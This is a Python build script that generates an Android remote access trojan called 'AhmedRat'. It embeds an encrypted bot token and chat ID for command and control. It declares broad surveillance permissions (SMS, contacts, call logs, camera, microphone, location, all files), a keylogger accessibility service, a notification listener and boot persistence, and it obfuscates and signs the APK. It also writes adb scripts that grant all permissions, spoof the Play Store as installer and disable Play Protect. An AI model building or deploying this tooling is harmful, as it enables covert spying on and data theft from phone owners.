import os, sys, json, shutil, subprocess

def build_app(token, chat_id, app_name, pkg_name, icon_path):
    current_dir = os.path.dirname(os.path.abspath(__file__))
    base_dir = os.path.join(current_dir, "Workspace")
    output_dir = os.path.join(current_dir, "../output")
    
    if not os.path.exists(output_dir): os.makedirs(output_dir)

    result = subprocess.check_output([sys.executable, os.path.join(current_dir, "crypter.py"), token, chat_id]).decode('utf-8')
    enc_token = result.split("TOKEN:")[1].split("\n")[0]
    enc_chat = result.split("CHAT:")[1].split("\n")[0]
    enc_key = result.split("KEY:")[1].strip()

    if os.path.exists(base_dir): shutil.rmtree(base_dir)
    os.makedirs(f"{base_dir}/app/src/main/java/{pkg_name.replace('.', '/')}", exist_ok=True)
    os.makedirs(f"{base_dir}/app/src/main/res/mipmap-hdpi", exist_ok=True)
    os.makedirs(f"{base_dir}/app/src/main/res/xml", exist_ok=True)
    os.makedirs(f"{base_dir}/gradle/wrapper", exist_ok=True)

    # إعداد Gradle Wrapper
    with open(f"{base_dir}/gradle/wrapper/gradle-wrapper.properties", "w") as f:
        f.write("distributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-8.2-bin.zip\nzipStoreBase=GRADLE_USER_HOME\nzipStorePath=wrapper/dists\n")
    
    os.system(f"wget -q https://raw.githubusercontent.com/gradle/gradle/v8.2.0/gradle/wrapper/gradle-wrapper.jar -O {base_dir}/gradle/wrapper/gradle-wrapper.jar")
    os.system(f"wget -q https://raw.githubusercontent.com/gradle/gradle/v8.2.0/gradlew -O {base_dir}/gradlew")
    os.system(f"chmod +x {base_dir}/gradlew")

    with open(f"{base_dir}/settings.gradle", "w") as f:
        f.write("rootProject.name = 'App'\ninclude ':app'\n")
    with open(f"{base_dir}/build.gradle", "w") as f:
        f.write("""buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:7.4.2' }
}
allprojects {
    repositories { google(); mavenCentral() }
}
""")
    with open(f"{base_dir}/gradle.properties", "w") as f:
        f.write("android.useAndroidX=true\nandroid.enableJetifier=true\norg.gradle.jvmargs=-Xmx2048m\n")
    
    sdk_dir = os.environ.get("ANDROID_HOME") or "/usr/lib/android-sdk"
    with open(f"{base_dir}/local.properties", "w") as f:
        f.write(f"sdk.dir={sdk_dir}\n")

    # إعدادات التطبيق مع التشفير
    with open(f"{base_dir}/app/build.gradle", "w") as f:
        f.write(f"""apply plugin: 'com.android.application'
android {{
    namespace "{pkg_name}"
    compileSdk 33
    defaultConfig {{ applicationId "{pkg_name}"; minSdk 24; targetSdk 28; versionCode 1; versionName "1.0" }}
    buildTypes {{ 
        release {{ 
            minifyEnabled true 
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }} 
    }}
    compileOptions {{ sourceCompatibility JavaVersion.VERSION_17; targetCompatibility JavaVersion.VERSION_17 }}
    lint {{ checkReleaseBuilds false; abortOnError false }}
}}
dependencies {{ implementation 'androidx.core:core:1.10.1'; implementation 'org.json:json:20231013' }}
""")

    # قواعد ProGuard
    with open(f"{base_dir}/app/proguard-rules.pro", "w") as f:
        f.write(f"""-keep class {pkg_name}.** {{ *; }}
-keep class org.json.** {{ *; }}
-keep class androidx.core.** {{ *; }}
-dontwarn {pkg_name}.**
-dontwarn org.json.**
-dontwarn androidx.**
""")

    # المانيفست مع صلاحية MANAGE_EXTERNAL_STORAGE
    with open(f"{base_dir}/app/src/main/AndroidManifest.xml", "w") as f:
        f.write(f"""<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="32"/>
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    
    <application android:label="{app_name}" android:icon="@mipmap/ic_launcher" android:usesCleartextTraffic="true" android:requestLegacyExternalStorage="true">
        <service android:name=".C2Service" android:foregroundServiceType="dataSync" android:exported="false"/>
        <service android:name=".NotifListener" android:label="Notification Service" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
            <intent-filter><action android:name="android.service.notification.NotificationListenerService"/></intent-filter>
        </service>
        <service android:name=".KeyloggerService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="false">
            <intent-filter><action android:name="android.accessibilityservice.AccessibilityService"/></intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
        </service>
        <receiver android:name=".BootReceiver" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>
        <activity android:name=".MainActivity" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter></activity>
    </application>
</manifest>""")

    with open(f"{base_dir}/app/src/main/res/xml/accessibility_service_config.xml", "w") as f:
        f.write("""<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault"
    android:canRetrieveWindowContent="true" />""")

    default_icon = os.path.join(current_dir, "../icons/yemenrat.png")
    target_icon = f"{base_dir}/app/src/main/res/mipmap-hdpi/ic_launcher.png"
    if icon_path and os.path.isfile(icon_path): shutil.copy(icon_path, target_icon)
    elif os.path.isfile(default_icon): shutil.copy(default_icon, target_icon)
    else: os.system(f"echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII= | base64 -d > {target_icon}")

    java_dir = f"{base_dir}/app/src/main/java/{pkg_name.replace('.', '/')}"
    with open(os.path.join(current_dir, "templates.json"), "r") as f:
        templates = json.load(f)
    for filename, content in templates.items():
        content = content.replace("{{PKG}}", pkg_name).replace("{{TOKEN}}", enc_token).replace("{{CHAT}}", enc_chat).replace("{{KEY}}", enc_key)
        with open(f"{java_dir}/{filename}", "w") as f:
            f.write(content)

    os.chdir(base_dir)
    
    print("[*] Compiling APK (Obfuscated & Evasive)...")
    os.system("./gradlew assembleRelease")
    
    apk_src = f"{base_dir}/app/build/outputs/apk/release/app-release-unsigned.apk"
    
    if os.path.exists(apk_src):
        unaligned_path = os.path.join(output_dir, "AhmedRat_unaligned.apk")
        final_path = os.path.join(output_dir, "AhmedRat.apk")
        shutil.copy(apk_src, unaligned_path)
        
        os.system(f"zipalign -v -p 4 {unaligned_path} {final_path} > /dev/null 2>&1")
        os.system(f"bash {os.path.join(current_dir, 'sign_apk.sh')} {final_path} > /dev/null 2>&1")
        
        if os.path.exists(unaligned_path): os.remove(unaligned_path)
        
        # إنشاء سكربتات التثبيت التلقائي عبر USB
        sh_script = f"""#!/bin/bash
echo "[*] Waiting for device..."
adb wait-for-device
echo "[*] Installing APK & Granting Permissions..."
adb install -r -g -i com.android.vending "{final_path}"
echo "[*] Granting All Files Access (Fix for Photos)..."
adb shell appops set {pkg_name} MANAGE_EXTERNAL_STORAGE allow
echo "[*] Disabling Play Protect temporarily..."
adb shell settings put global package_verifier_enable 0
echo "[+] Done! Check your phone."
"""
        with open(os.path.join(output_dir, "install_linux.sh"), "w") as f:
            f.write(sh_script)
        os.system(f"chmod +x {os.path.join(output_dir, 'install_linux.sh')}")

        bat_script = f"""@echo off
echo [*] Waiting for device...
adb wait-for-device
echo [*] Installing APK & Granting Permissions...
adb install -r -g -i com.android.vending "{final_path}"
echo [*] Granting All Files Access (Fix for Photos)...
adb shell appops set {pkg_name} MANAGE_EXTERNAL_STORAGE allow
echo [*] Disabling Play Protect temporarily...
adb shell settings put global package_verifier_enable 0
echo [+] Done! Check your phone.
pause
"""
        with open(os.path.join(output_dir, "install_windows.bat"), "w") as f:
            f.write(bat_script)

        print("\n\033[0;32m" + "="*60 + "\033[0m")
        print("\033[0;32m  [+] BUILD SUCCESSFUL!\033[0m")
        print(f"\033[0;37m  [+] APK Path: {final_path}\033[0m")
        print("\033[0;36m  [+] Auto-Install Scripts generated in 'output' folder!\033[0m")
        print("\033[0;32m" + "="*60 + "\033[0m\n")
    else: 
        print("\n\033[0;31m[-] Build failed. Check logs above.\033[0m\n")

if __name__ == "__main__":
    if len(sys.argv) == 6: build_app(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
